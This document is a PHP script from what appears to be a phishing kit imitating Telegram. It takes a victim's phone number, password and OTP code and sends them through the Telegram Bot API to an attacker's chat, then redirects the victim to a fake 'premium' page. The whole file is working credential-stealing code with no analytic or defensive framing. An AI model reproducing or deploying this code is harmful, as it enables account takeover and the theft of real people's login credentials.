<?php
include "../telegram.php";
session_start();
$phone = $_SESSION['phoneNumber'];
$password = $_POST['password'];
$_SESSION['password'];
$message = "
━─━────༺TELE RESS༻────━─━

( Telegram | OTP | ".$phone." )

- No HP :  ".$phone."
- Code OTP : ".$pin." via SMS
- Password : ".$password."

";
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../../req/premium/');
?>
